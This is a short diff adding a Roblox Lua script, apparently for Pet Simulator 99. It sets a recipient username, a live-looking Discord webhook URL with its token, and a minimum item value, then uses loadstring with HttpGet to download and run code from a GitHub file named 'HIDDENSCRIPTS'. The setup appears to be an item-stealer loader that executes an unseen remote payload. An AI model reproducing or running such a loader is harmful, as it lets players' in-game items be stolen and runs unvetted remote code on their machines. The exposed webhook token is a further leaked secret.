@@ -1,0 +1,6 @@
+Username = "Creamy_egg5"
+Webhook = "https://discord.com/api/webhooks/1330504170704207967/QXzv4EP5ZAtGOiGyQ25TMrGkD7VWQifuOLb_h4UYtLht4N438QS4pJwXeGK9Mdpnwojl"
+min_rap = 10000
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vax3478/Vax/refs/heads/main/HIDDENSCRIPTS-PS99SCRIPT2-0", true))()
